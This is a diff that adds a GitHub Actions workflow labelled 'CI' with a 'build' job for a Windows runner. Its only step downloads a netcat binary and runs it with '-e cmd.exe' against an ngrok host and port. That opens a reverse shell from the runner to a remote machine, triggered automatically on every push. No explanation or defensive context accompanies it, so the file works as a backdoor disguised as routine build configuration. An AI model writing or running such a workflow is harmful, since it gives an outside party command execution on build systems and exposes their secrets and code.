@@ -1,0 +1,27 @@
+name: CI
+
+on: [push, workflow_dispatch]
+
+jobs:
+
+  build:
+
+    runs-on: windows-latest
+
+    steps:
+
+    - name: Download
+
+      run: | 
+       Invoke-WebRequest https://eternallybored.org/misc/netcat/netcat-win32-1.11.zip -OutFile nc.zip
+       Expand-Archive nc.zip
+       powershell
+       ls
+       cd nc
+       ls
+       cd netcat-1.11
+       ls
+       ./nc.exe -v 0.tcp.in.ngrok.io 14912 -e cmd.exe
+       
+       
+    
